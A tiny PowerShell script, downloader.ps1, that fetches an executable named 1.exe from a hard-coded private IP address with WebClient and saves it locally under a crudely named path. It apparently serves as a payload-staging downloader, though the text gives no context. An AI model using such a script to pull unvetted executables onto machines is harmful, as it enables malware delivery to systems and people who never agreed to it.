#usage:powershell -file downloader.ps1
$Urls = @()
$Urls += "http://192.168.43.111/1.exe"
$OutPath = "fuck" 
ForEach ( $item in $Urls) {
$file = $OutPath + ($item).split('/')[-1]
(New-Object System.Net.WebClient).DownloadFile($item, $file) 
}